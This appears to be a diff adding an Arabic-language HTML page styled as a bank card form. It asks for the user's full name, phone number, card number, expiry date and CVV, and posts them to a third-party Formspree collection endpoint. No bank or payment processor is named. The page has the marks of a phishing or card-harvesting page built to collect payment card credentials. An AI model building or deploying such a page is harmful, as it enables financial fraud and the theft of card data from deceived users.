@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال البيانات الشخصية</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #1e1b18; /* لون داكن مستوحى من الخلفية المحفظية الفاخرة */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card-container {
+            background: linear-gradient(145deg, #163238 0%, #0d1b1e 100%); /* التدرج اللوني الداكن المائل للأزرق المخضر */
+            padding: 30px 25px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), inset 0 1px 2px rgba(255, 255, 255, 0.1);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .card-title {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 0;
+        }
+        .icon-bank {
+            font-size: 22px;
+            color: #d4af37; /* لون ذهبي برونزي للأيقونات */
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #c5b69e; /* لون ذهبي باهت للمسميات تطابق الصورة */
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: rgba(255, 255, 255, 0.07);
+            color: #ffffff;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+        .form-group input:focus {
+            border-color: #d4af37;
+            background-color: rgba(255, 255, 255, 0.12);
+            outline: none;
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.2);
+        }
+        .row-fields {
+            display: flex;
+            gap: 15px;
+        }
+        .row-fields .form-group {
+            flex: 1;
+        }
+        .sub-label {
+            display: block;
+            text-align: center;
+            font-size: 11px;
+            color: #a2917d;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(180deg, #d8c29d 0%, #bfa883 100%); /* زر ذهبي معدني مطفأ */
+            color: #1a1a1a;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #e4d0b0 0%, #ccb591 100%);
+            transform: translateY(-1px);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+<div class="card-container">
+    <div class="card-header">
+        <span class="icon-bank">🏛️</span>
+        <h2 class="card-title">إدخال البيانات الشخصية</h2>
+        <span class="icon-bank">📶</span>
+    </div>
+    
+    <form action="https://formspree.io/f/xykrwvdv" method="POST">
+        
+        <!-- الاسم الكامل -->
+        <div class="form-group">
+            <label for="name">الاسم الكامل</label>
+            <input type="text" id="name" name="الاسم" placeholder="أدخل الاسم الكامل" required>
+        </div>
+
+        <!-- رقم الجوال -->
+        <div class="form-group">
+            <label for="phone">رقم الجوال (مع مفتاح الدولة)</label>
+            <input type="tel" id="phone" name="رقم_الجوال" placeholder="مثال: 966500000000+" required>
+        </div>
+
+        <!-- رقم البطاقة -->
+        <div class="form-group">
+            <label for="card-number">رقم البطاقة</label>
+            <input type="text" id="card-number" name="رقم_البطاقة" placeholder="XXXX XXXX XXXX XXXX" required>
+        </div>
+
+        <!-- التاريخ والرمز الخاص في سطر واحد -->
+        <div class="row-fields">
+            <!-- التاريخ -->
+            <div class="form-group">
+                <span class="sub-label">VALID THRU</span>
+                <label for="expiry-date" style="text-align: center;">التاريخ (شهر/سنة)</label>
+                <input type="text" id="expiry-date" name="التاريخ_ش_س" placeholder="يوليو 2026" required>
+            </div>
+
+            <!-- الرمز الخاص -->
+            <div class="form-group">
+                <span class="sub-label">&nbsp;</span>
+                <label for="cvv" style="text-align: center;">الرمز الخاص</label>
+                <input type="text" id="cvv" name="الرمز_الخاص" maxlength="3" pattern="\d{3}" placeholder="556" required>
+            </div>
+        </div>
+
+        <!-- زر الإرسال المتناسق -->
+        <button type="submit" class="submit-btn">إرسال البيانات</button>
+        
+    </form>
+</div>
+
+</body>
+</html>
